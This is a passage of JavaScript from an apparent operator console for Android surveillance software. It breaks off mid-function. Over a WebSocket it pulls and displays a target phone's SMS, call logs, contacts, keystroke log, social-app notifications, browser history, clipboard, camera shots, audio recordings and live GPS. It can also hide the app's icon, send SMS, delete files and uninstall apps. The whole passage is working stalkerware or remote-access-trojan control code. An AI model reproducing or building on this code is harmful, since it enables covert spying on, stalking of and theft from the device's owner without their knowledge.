            case 'CLIPBOARD_DATA':
                displayClipboard(parseData(json.data));
                pendingCommand = null;
                break;
            case 'WIFI_NETWORKS_DATA':
                displayWifiNetworks(parseData(json.data));
                pendingCommand = null;
                break;
            case 'GEOFENCE_SET':
                showNotification('✅ Geofence activated');
                break;
            case 'GEOFENCE_CLEARED':
                showNotification('Geofence cleared');
                break;
            case 'GEOFENCE_INFO': {
                const gf = json.data;
                if (gf && gf.active) {
                    panel.innerHTML = `<h3>🗺️ Geofence Status</h3>
                        <div style="background:#e8f5e9;border:1px solid #4caf50;border-radius:10px;padding:16px;max-width:360px;">
                            <div style="color:#2e7d32;font-weight:700;margin-bottom:8px;">● Active</div>
                            <div>📍 ${gf.lat.toFixed(5)}, ${gf.lon.toFixed(5)}</div>
                            <div>📏 Radius: ${gf.radius}m</div>
                            <div style="margin-top:12px;display:flex;gap:8px;">
                                <button onclick="sendCommand('CLEAR_GEOFENCE')" style="padding:6px 14px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;">Clear</button>
                                <button onclick="showGeofencePanel()" style="padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:6px;cursor:pointer;">Edit</button>
                            </div>
                        </div>`;
                } else {
                    panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
                }
                break;
            }
            case 'GEOFENCE_ALERT': {
                const msg = json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone';
                pushAlert('Geofence', msg);
                showNotification(msg);
                break;
            }
            case 'SCHEDULED_CAPTURE_SET':
                showNotification('✅ Auto-capture started');
                break;
            case 'SCHEDULED_CAPTURE_STOPPED':
                showNotification('Auto-capture stopped');
                break;
            case 'DEVICE_LOCKED':
                showNotification('🔒 Screen locked');
                break;
            case 'SMS_SENT':
                showNotification('✅ SMS sent successfully');
                break;
            case 'FILE_DELETED':
                showNotification('File deleted');
                sendCommand('LIST_FILES', { path: currentPath || 'root' });
                break;
            case 'VIBRATE_COMPLETE':
                showNotification('📳 Vibrated');
                break;
            case 'UNINSTALL_INITIATED':
                showNotification('Uninstall initiated');
                break;
            case 'APP_OPENED':
                showNotification('App opened');
                break;
            case 'GPS_UPDATES_STOPPED':
                liveGpsActive = false;
                { const b = document.getElementById('liveGpsBtn'); if(b){ b.querySelector('span:last-child').textContent='Live GPS Track'; b.style.cssText=''; } }
                showNotification('GPS tracking stopped');
                break;
            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file'; currentData = json; renderFiles(); pendingCommand = null;
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms'; currentData = json; renderTable(); pendingCommand = null;
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call'; currentData = json; renderTable(); pendingCommand = null;
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json); pendingCommand = null;
                }
                break;
        }
    }

    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
            pendingCommand = null;
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
            pendingCommand = null;
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { screenPC.close(); screenPC = null; }
            showNotification('Screen share stopped');
            pendingCommand = null;
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
            pendingCommand = null;
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
            pendingCommand = null;
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
            pendingCommand = null;
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
            pendingCommand = null;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            downloadBase64(base64, 'downloaded_file');
            pendingCommand = null;
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            // Try to parse as JSON (raw response from device)
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function setStatus(s) {
        statusEl.innerText = s;
        if (s === 'ONLINE') {
            statusEl.classList.remove('offline');
            statusEl.style.background = '#e8f5e9';
            statusEl.style.color = '#2e7d32';
        } else {
            statusEl.classList.add('offline');
            statusEl.style.background = '#ffebee';
            statusEl.style.color = '#c62828';
        }
    }

    // ---------- CAMERA UI ----------
    function toggleCameraPanel(panelId) {
        const clickPanel = document.getElementById('clickCameraPanel');
        const livePanel = document.getElementById('liveCameraPanel');
        if (panelId === 'click') {
            clickPanel.classList.toggle('show');
            livePanel.classList.remove('show');
        } else {
            livePanel.classList.toggle('show');
            clickPanel.classList.remove('show');
        }
    }

    function capturePicture() {
        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
        const useFlash = document.getElementById('clickFlashCheckbox').checked;
        sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
    }

    function displayCapturedImage(base64) {
        panel.innerHTML = `
            <img src="data:image/jpeg;base64,${base64}">
            <div style="margin-top:10px;">
                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
            </div>
        `;
    }

    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
    function takeSnapshot() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.videoWidth) {
            alert('No live video or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.png`;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/png');
    }

   function toggleRecording() {
    const video = document.getElementById('liveCamVideo');
    if (!video || !video.srcObject) {
        alert('No live stream');
        return;
    }
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        document.getElementById('recordBtn').innerText = 'Record Video';
    } else {
        recordedChunks = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const stream = video.srcObject;

        if (video.videoWidth === 0) {
            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
        } else {
            startCanvasRecording(video, canvas, ctx, stream);
        }
    }
}

function startCanvasRecording(video, canvas, ctx, originalStream) {
    // Swap dimensions for 90° rotation
    canvas.width = video.videoHeight;
    canvas.height = video.videoWidth;

    function drawVideoFrame() {
        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(90 * Math.PI / 180); // clockwise 90°
        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
                     video.videoWidth, video.videoHeight);
        ctx.restore();
        requestAnimationFrame(drawVideoFrame);
    }
    drawVideoFrame();

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recording_${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());
    };
    mediaRecorder.start();
    document.getElementById('recordBtn').innerText = 'Stop Recording';
}
    // ---------- APP ICON TOGGLE ----------
    function toggleAppIcon() {
        if (iconHidden) sendPlainText('showApp');
        else sendPlainText('hideApp');
    }

    // ---------- RENDERERS ----------
    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function downloadBase64(b64, filename) {
        const a = document.createElement('a');
        a.href = 'data:application/octet-stream;base64,' + b64;
        a.download = filename;
        a.click();
    }

    function renderMap(loc) {
        panel.innerHTML = '<div id="map" style="position:relative;"></div><div id="mapButtons" style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;"></div>';
        const mapDiv = document.getElementById('map');

        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
            <div class="addr">🌍 Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);

        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

        // Add geofence shortcut button
        const mapBtns = document.getElementById('mapButtons');
        if (mapBtns) {
            mapBtns.innerHTML = `
                <button onclick="useLocationAsGeofence(${loc.lat},${loc.lon})"
                    style="padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">
                    🗺️ Set Geofence Here
                </button>
                <a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank"
                    style="padding:5px 12px;background:#1976ff;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none;">
                    Open in Google Maps
                </a>`;
        }

        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });
    }

    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        let headers = [], rows = [];
        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    function renderFiles() {
        let html = `
            <div class="file-manager">
                <div class="file-toolbar-sticky">
                    <div class="file-toolbar">
                        <button onclick="navigateUp()">⬆ Up</button>
                        <span class="file-path">${currentPath}</span>
                        <div class="download-selected">
                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
                        </div>
                    </div>
                </div>
        `;

        if (!currentData || currentData.length === 0) {
            html += '<p style="padding:20px;">No files found.</p>';
        } else {
            const folders = currentData.filter(item => item.isDir);
            const files = currentData.filter(item => !item.isDir);
            selectedFiles = [];

            html += `
                <div class="file-panes">
                    <div class="folder-pane">
                        <div class="pane-title">Folders</div>
                        <div id="folderList">
            `;

            folders.forEach(f => {
                html += `
                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
                        <span class="folder-icon">📁</span>
                        <span class="folder-name">${f.name}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                    <div class="file-pane">
                        <div class="pane-title">Files</div>
                        <div id="fileList">
            `;

            files.forEach(f => {
                const path = f.path;
                const name = f.name;
                const size = formatBytes(f.size);
                html += `
                    <div class="file-item">
                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
                        <span class="file-icon">📄</span>
                        <span class="file-name">${name}</span>
                        <span class="file-size">${size}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                </div>
            `;
        }

        html += '</div>';
        panel.innerHTML = html;
    }

    function handleFolderClick(path) {
        currentPath = path;
        sendCommand('LIST_FILES', { path: path });
    }

    function navigateUp() {
        if (currentPath === 'root' || currentPath === '') return;
        let parts = currentPath.split('/');
        parts.pop();
        let parent = parts.join('/');
        if (parent === '') parent = 'root';
        currentPath = parent;
        sendCommand('LIST_FILES', { path: parent });
    }

    function updateSelected(checkbox) {
        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) selectedFiles.push(path);
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
        }
    }

    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;
        }
        selectedFiles.forEach(path => {
            sendPlainText('dl ' + path);
        });
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function showNotification(text) {
        const orig = statusEl.innerText;
        statusEl.innerText = text;
        setTimeout(() => { statusEl.innerText = orig; }, 2000);
    }

    // ---------- WEBSOCKET MESSAGE HANDLER ----------
    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                // Assume it's a command response or other JSON
                handleJSON(json);
            }
        } catch (e) {
            // Not JSON – treat as plain text
            handlePlainText(msg);
        }
    }

    // ---------- WEBSOCKET CONNECTION ----------
    function connectWebSocket() {
        if (ws) {
            ws.close();
        }
        setStatus('CONNECTING');
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('ONLINE');
            panel.innerHTML = '✅ Connected to server. Ready.';
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data);
            handleIncomingMessage(e.data);
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
            ws = null;
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }
// Add this inside your <script> (after DOM is ready)
document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
    radio.addEventListener('change', function() {
        const flashCheckbox = document.getElementById('clickFlashCheckbox');
        const flashLabel = flashCheckbox.closest('.camera-option'); // the container div
        if (this.value === 'front') {
            flashLabel.style.display = 'none';
        } else {
            flashLabel.style.display = ''; // show again
        }
    });
});
// Also trigger on page load for initial state
window.addEventListener('load', () => {
    const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
    if (selected && selected.value === 'front') {
        document.getElementById('clickFlashCheckbox').closest('.camera-option').style.display = 'none';
    }
});
    // ---------- UTILITIES ----------
    // (currentPath declared in globals above)
    let liveGpsActive = false;
    const alerts = [];
    let geofenceMap = null;

    function parseData(data) {
        if (typeof data === 'string') { try { return JSON.parse(data); } catch(e) { return data; } }
        return data;
    }

    // ── Alerts ────────────────────────────────────────────────────────────────
    function pushAlert(title, body) {
        alerts.unshift({ title, body, time: new Date().toLocaleTimeString() });
        if (alerts.length > 50) alerts.pop();
        const badge = document.getElementById('alertsBadge');
        const list  = document.getElementById('alertsList');
        if (!badge || !list) return;
        badge.style.display = 'block';
        list.innerHTML = alerts.map(a =>
            `<div style="margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px;">
                <strong>${a.time}</strong> ${a.title}: ${a.body}
            </div>`).join('');
    }
    function clearAlerts() {
        alerts.length = 0;
        const badge = document.getElementById('alertsBadge');
        if (badge) badge.style.display = 'none';
    }

    // ── Live GPS ──────────────────────────────────────────────────────────────
    function toggleLiveGps() {
        if (!liveGpsActive) {
            sendCommand('START_GPS_UPDATES');
            liveGpsActive = true;
            const b = document.getElementById('liveGpsBtn');
            if (b) { b.querySelector('span:last-child').textContent = 'Stop GPS Track'; b.style.background='#d32f2f'; b.style.color='#fff'; }
            showNotification('🛰️ Live GPS started');
        } else {
            sendCommand('STOP_GPS_UPDATES');
            liveGpsActive = false;
            const b = document.getElementById('liveGpsBtn');
            if (b) { b.querySelector('span:last-child').textContent = 'Live GPS Track'; b.style.cssText=''; }
            showNotification('GPS stopped');
        }
    }

    // ── Contacts ──────────────────────────────────────────────────────────────
    function displayContacts(data) {
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>👥 Contacts</h3><p style="color:#999">No contacts found.</p>'; return; }
        let html = `<h3>👥 Contacts (${data.length})</h3>
            <input type="text" placeholder="Search…" oninput="filterRows(this,'contactsTbody')"
                style="width:100%;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-bottom:10px;box-sizing:border-box;">
            <div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:13px;">
            <thead><tr style="background:#f5f7fa;"><th style="padding:8px;text-align:left;">Name</th><th style="padding:8px;text-align:left;">Number</th><th style="padding:8px;">Calls</th></tr></thead>
            <tbody id="contactsTbody">`;
        data.forEach(c => { html += `<tr style="border-bottom:1px solid #f0f0f0;"><td style="padding:7px 8px;">${c.name||''}</td><td style="padding:7px 8px;font-family:monospace;">${c.number||''}</td><td style="padding:7px 8px;text-align:center;">${c.timesContacted||0}</td></tr>`; });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Installed Apps ────────────────────────────────────────────────────────
    function displayInstalledApps(data) {
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>📱 Apps</h3><p style="color:#999">No apps found.</p>'; return; }
        let html = `<h3>📱 Installed Apps (${data.length})</h3>
            <input type="text" placeholder="Search…" oninput="filterRows(this,'appsTbody')"
                style="width:100%;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-bottom:10px;box-sizing:border-box;">
            <div style="overflow-x:auto;max-height:500px;overflow-y:auto;"><table style="width:100%;border-collapse:collapse;font-size:13px;">
            <thead><tr style="background:#f5f7fa;position:sticky;top:0;"><th style="padding:8px;text-align:left;">App</th><th style="padding:8px;text-align:left;">Package</th><th style="padding:8px;">Actions</th></tr></thead>
            <tbody id="appsTbody">`;
        data.forEach(a => {
            html += `<tr style="border-bottom:1px solid #f0f0f0;">
                <td style="padding:7px 8px;">${a.appName||''}</td>
                <td style="padding:7px 8px;font-size:11px;color:#999;">${a.packageName||''}</td>
                <td style="padding:7px 8px;text-align:center;white-space:nowrap;">
                    <button onclick="sendCommand('OPEN_APP',{package:'${a.packageName}'})" style="padding:3px 8px;font-size:11px;background:#1976ff;color:#fff;border:none;border-radius:4px;cursor:pointer;margin-right:4px;">Open</button>
                    <button onclick="if(confirm('Uninstall ${a.appName}?'))sendCommand('UNINSTALL_APP',{package:'${a.packageName}'})" style="padding:3px 8px;font-size:11px;background:#d32f2f;color:#fff;border:none;border-radius:4px;cursor:pointer;">Remove</button>
                </td></tr>`;
        });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Screen Time ───────────────────────────────────────────────────────────
    function showAppUsagePanel() {
        panel.innerHTML = `<h3>📊 Screen Time</h3>
            <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
                <button onclick="sendCommand('GET_APP_USAGE',{days:1})" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;">Today</button>
                <button onclick="sendCommand('GET_APP_USAGE',{days:7})" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;">7 Days</button>
                <button onclick="sendCommand('GET_APP_USAGE',{days:30})" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;">30 Days</button>
            </div>
            <p style="color:#999;font-size:12px;">⚠️ Requires Usage Access permission on device</p>`;
    }
    function displayAppUsage(data) {
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No usage data. Enable Usage Access in device settings.</p>'; return; }
        const maxMs = data[0].totalTimeMs || 1;
        let html = `<h3>📊 Screen Time (${data.length} apps)</h3><div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:13px;">
            <thead><tr style="background:#f5f7fa;"><th style="padding:8px;text-align:left;">App</th><th style="padding:8px;">Usage</th><th style="padding:8px;min-width:100px;text-align:left;">Bar</th></tr></thead><tbody>`;
        data.forEach(a => {
            const pct = Math.max(2, Math.round(a.totalTimeMs/maxMs*100));
            const col = a.totalTimeMs>3600000?'#d32f2f':a.totalTimeMs>1800000?'#ff9800':'#4caf50';
            html += `<tr style="border-bottom:1px solid #f0f0f0;">
                <td style="padding:7px 8px;">${a.appName}</td>
                <td style="padding:7px 8px;text-align:center;font-weight:600;">${a.totalTimeFmt}</td>
                <td style="padding:7px 8px;"><div style="height:10px;background:${col};border-radius:5px;width:${pct}%;"></div></td></tr>`;
        });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Social Messages (Notifications) ──────────────────────────────────────
    function displayNotifications(data) {
        if (!Array.isArray(data) || data.length === 0) {
            panel.innerHTML = `<h3>🔔 Social Messages</h3>
                <p style="color:#999;margin-top:16px;">No messages yet. Enable Notification Access on device.<br>Settings → Apps → Special App Access → Notification Access</p>
                <button onclick="sendCommand('CLEAR_NOTIFICATIONS')" style="margin-top:12px;padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">Clear All</button>`;
            return;
        }
        const apps = [...new Set(data.map(n=>n.app))];
        let html = `<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px;">
            <h3 style="margin:0;">🔔 Social Messages (${data.length})</h3>
            <button onclick="sendCommand('CLEAR_NOTIFICATIONS')" style="padding:5px 12px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">Clear</button>
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
            <button onclick="filterNotifs('ALL')" style="padding:3px 10px;background:#1976ff;color:#fff;border:none;border-radius:12px;cursor:pointer;font-size:12px;">All</button>
            ${apps.map(a=>`<button onclick="filterNotifs('${a}')" style="padding:3px 10px;background:#e3f2fd;color:#1976ff;border:none;border-radius:12px;cursor:pointer;font-size:12px;">${a}</button>`).join('')}
        </div>
        <div id="notifList">`;
        [...data].reverse().forEach(n => {
            html += `<div class="notif-item" data-app="${n.app}" style="background:#fff;border:1px solid #e8e8e8;border-radius:8px;padding:10px;margin-bottom:8px;">
                <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
                    <span style="font-weight:700;font-size:13px;">${n.app}</span>
                    <span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span>
                </div>
                <div style="font-size:13px;font-weight:600;color:#555;">${n.title||''}</div>
                <div style="font-size:13px;color:#333;margin-top:2px;">${n.text||''}</div>
            </div>`;
        });
        html += '</div>';
        panel.innerHTML = html;
    }
    function filterNotifs(app) {
        document.querySelectorAll('.notif-item').forEach(el => {
            el.style.display = (app==='ALL'||el.dataset.app===app) ? 'block' : 'none';
        });
    }

    // ── Keylog ────────────────────────────────────────────────────────────────
    function displayKeylog(data) {
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p style="color:#999">No keystrokes yet. Enable Accessibility Service on device.</p>'; return; }
        let html = `<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
            <h3 style="margin:0;">⌨️ Keyboard Log (${data.length})</h3>
            <button onclick="sendCommand('CLEAR_KEYLOG')" style="padding:5px 12px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">Clear</button>
        </div><div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:12px;">
        <thead><tr style="background:#f5f7fa;"><th style="padding:8px;text-align:left;">Time</th><th style="padding:8px;text-align:left;">App</th><th style="padding:8px;text-align:left;">Text</th></tr></thead><tbody>`;
        [...data].reverse().forEach(e => {
            html += `<tr style="border-bottom:1px solid #f0f0f0;">
                <td style="padding:5px 8px;color:#999;white-space:nowrap;">${e.timeFmt||''}</td>
                <td style="padding:5px 8px;font-size:11px;">${(e.pkg||'').split('.').pop()}</td>
                <td style="padding:5px 8px;font-family:monospace;">${e.text||''}</td></tr>`;
        });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Browser History ───────────────────────────────────────────────────────
    function displayBrowserHistory(data) {
        if (!data || data.error) { panel.innerHTML = `<h3>🌐 Browser History</h3><p style="color:#999">${data?.error||'Not available on this device/browser.'}</p>`; return; }
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999">No history found.</p>'; return; }
        let html = `<h3>🌐 Browser History (${data.length})</h3>
            <input type="text" placeholder="Search URLs…" oninput="filterRows(this,'histTbody')"
                style="width:100%;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-bottom:10px;box-sizing:border-box;">
            <div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:12px;">
            <thead><tr style="background:#f5f7fa;"><th style="padding:8px;text-align:left;">Date</th><th style="padding:8px;text-align:left;">Title</th><th style="padding:8px;text-align:left;">URL</th></tr></thead>
            <tbody id="histTbody">`;
        data.forEach(i => {
            html += `<tr style="border-bottom:1px solid #f0f0f0;">
                <td style="padding:5px 8px;white-space:nowrap;color:#999;">${i.date||''}</td>
                <td style="padding:5px 8px;">${i.title||''}</td>
                <td style="padding:5px 8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
                    <a href="${i.url}" target="_blank" style="color:#1976ff;text-decoration:none;">${i.url||''}</a></td></tr>`;
        });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Wi-Fi Networks ────────────────────────────────────────────────────────
    function displayWifiNetworks(data) {
        if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>📶 Wi-Fi</h3><p style="color:#999">No networks found.</p>'; return; }
        let html = `<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:13px;">
            <thead><tr style="background:#f5f7fa;"><th style="padding:8px;text-align:left;">SSID</th><th style="padding:8px;">Signal</th><th style="padding:8px;">Status</th></tr></thead><tbody>`;
        data.forEach(n => {
            const bars = n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░';
            html += `<tr style="border-bottom:1px solid #f0f0f0;${n.connected?'background:#f0fff4;':''}">
                <td style="padding:7px 8px;font-weight:${n.connected?700:400};">${n.ssid||'(hidden)'}</td>
                <td style="padding:7px 8px;text-align:center;font-family:monospace;color:#1976ff;">${bars}</td>
                <td style="padding:7px 8px;text-align:center;">${n.connected?'<span style="color:#4caf50;font-weight:700;">● Connected</span>':'<span style="color:#ccc;">○</span>'}</td></tr>`;
        });
        html += '</tbody></table></div>';
        panel.innerHTML = html;
    }

    // ── Clipboard ─────────────────────────────────────────────────────────────
    function displayClipboard(data) {
        const clip = (typeof data === 'string') ? (() => { try { return JSON.parse(data); } catch(e) { return {content:data,type:'text'}; } })() : data;
        panel.innerHTML = `<h3>📋 Clipboard</h3>
            <div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;margin-top:12px;">
                <div style="font-size:11px;color:#999;margin-bottom:6px;">Type: ${clip?.type||'unknown'}</div>
